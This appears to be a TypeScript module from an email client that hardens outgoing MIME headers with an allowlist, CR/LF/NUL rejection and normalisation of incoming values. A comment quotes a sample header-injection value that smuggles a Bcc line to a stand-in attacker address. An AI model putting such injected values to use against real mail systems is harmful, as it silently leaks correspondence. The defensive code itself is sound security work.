import { z } from 'zod';

// lib/mime-headers.ts — frontière des en-têtes MIME sortants.
//
// `mail.send` acceptait `headers: z.record(z.string())` sans aucune validation, et
// `lib/driver/google-parse.ts` reversait le tout dans `msg.setHeader(key, value)`. Sonde sur
// mimetext 3.0.27 (version installée) : `setHeader('X-Test', 'ok\r\nBcc: attacker@evil.example')`
// produit un RAW où `Bcc:` occupe SA PROPRE LIGNE d'en-tête — la lib ne filtre rien. Le NOM est
// injectable de la même façon. Le sujet, lui, ne l'est pas : mimetext l'encode en base64.
//
// La source plausible n'est pas hypothétique : components/mail/reply-composer.tsx remplit
// `In-Reply-To`/`References` depuis `replyToMessage.messageId`/`.references`, extraits tels
// quels des en-têtes du mail ENTRANT. Un expéditeur hostile pose donc la valeur.
//
// Deux verrous, plus une normalisation à la source :
//   1. cette allowlist + le refus de CR/LF, au plus près de la frontière (schéma zod) ;
//   2. le même refus au PUITS (`setHeader`), parce que la file de messages (main.ts) reconstruit
//      un `IOutgoingMessage` sans repasser par le schéma tRPC ;
//   3. `normalizeHeaderValue`, appliqué à l'EXTRACTION des en-têtes entrants (google-parse.ts).

/**
 * En-têtes que le client a le droit de poser. Relevé exhaustif des producteurs réels avant
 * restriction : `components/mail/reply-composer.tsx` est le SEUL, et il en pose exactement
 * trois. `create-email.tsx`, `elevenlabs-tools.ts` et `email-utils.client.tsx` n'en passent
 * aucun. Tout ajout ici doit être motivé par un producteur existant.
 */
export const ALLOWED_OUTGOING_HEADERS = ['in-reply-to', 'references', 'thread-id'] as const;

const ALLOWED = new Set<string>(ALLOWED_OUTGOING_HEADERS);

/** CR et LF : les caractères qui font naître une ligne d'en-tête supplémentaire. */
const HEADER_INJECTION_PATTERN = /[\r\n]/;

/** NUL, tenu hors de toute classe de caractères en regex (règle lint `no-control-regex`). */
const NUL = String.fromCharCode(0);

/** Un nom de champ RFC 5322 : ASCII imprimable, sans espace ni deux-points. */
const HEADER_NAME_PATTERN = /^[!-9;-~]+$/;

export const isAllowedHeaderName = (name: string) => ALLOWED.has(name.trim().toLowerCase());

export const hasHeaderInjection = (value: string) =>
  HEADER_INJECTION_PATTERN.test(value) || value.includes(NUL);

export const isSafeHeaderName = (name: string) =>
  !hasHeaderInjection(name) && HEADER_NAME_PATTERN.test(name);

/**
 * Neutralise une valeur d'en-tête LUE sur un mail entrant, avant qu'elle ne circule. Les
 * ruptures de ligne deviennent des espaces plutôt que d'être coupées : une valeur repliée
 * légitime (`References` sur plusieurs lignes) garde son sens, une valeur injectée perd le sien.
 */
export const normalizeHeaderValue = (value: string): string =>
  value
    .split(NUL)
    .join('')
    .replace(/[\r\n]+/g, ' ')
    .trim();

/**
 * Schéma des en-têtes sortants : allowlist sur le nom, refus de CR/LF sur le nom ET la valeur.
 * `z.record` valide chaque clé et chaque valeur, si bien qu'une entrée hostile fait échouer
 * l'appel au lieu d'être silencieusement rognée — l'appelant doit savoir qu'il a été refusé.
 */
export const outgoingHeadersSchema = z.record(
  z
    .string()
    .refine(isSafeHeaderName, 'header name must not contain CR, LF or NUL')
    .refine(
      isAllowedHeaderName,
      `header name must be one of: ${ALLOWED_OUTGOING_HEADERS.join(', ')}`,
    ),
  z
    .string()
    .refine((value) => !hasHeaderInjection(value), 'header value must not contain CR, LF or NUL'),
);

/**
 * Dernier verrou, au puits : rend les en-têtes réellement posables. Tout ce qui n'est pas dans
 * l'allowlist, ou qui porte une rupture de ligne, est écarté silencieusement — ici on ne peut
 * plus faire échouer l'appel sans casser un envoi déjà accepté.
 */
export const safeOutgoingHeaders = (
  headers: Record<string, string> | undefined,
): [string, string][] => {
  if (!headers) return [];

  return Object.entries(headers).filter(
    ([name, value]) =>
      typeof value === 'string' &&
      value.length > 0 &&
      isSafeHeaderName(name) &&
      isAllowedHeaderName(name) &&
      !hasHeaderInjection(value),
  );
};
